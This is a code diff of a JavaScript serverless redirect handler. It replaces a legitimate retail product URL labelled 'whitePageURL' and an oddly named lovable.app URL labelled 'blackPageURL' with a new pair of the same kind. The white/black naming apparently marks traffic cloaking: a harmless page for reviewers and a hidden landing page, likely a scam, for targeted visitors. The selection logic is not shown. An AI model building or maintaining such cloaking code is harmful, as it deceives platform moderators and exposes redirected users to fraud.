@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://edenrobe.com/collections/women-unstitched/products/unstitched-light-beige-printed-lawn-2-piece-ewu5a1-35601st";
-    const blackPageURL = "https://msgurupml.lovable.app/";
+    const whitePageURL = "https://mastershop.com.au/collections/cases/products/speck-presidio-lux-grip-with-clicklock-iphone-17-standard-shade-orange";
+    const blackPageURL = "https://luvcshap.lovable.app/?";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
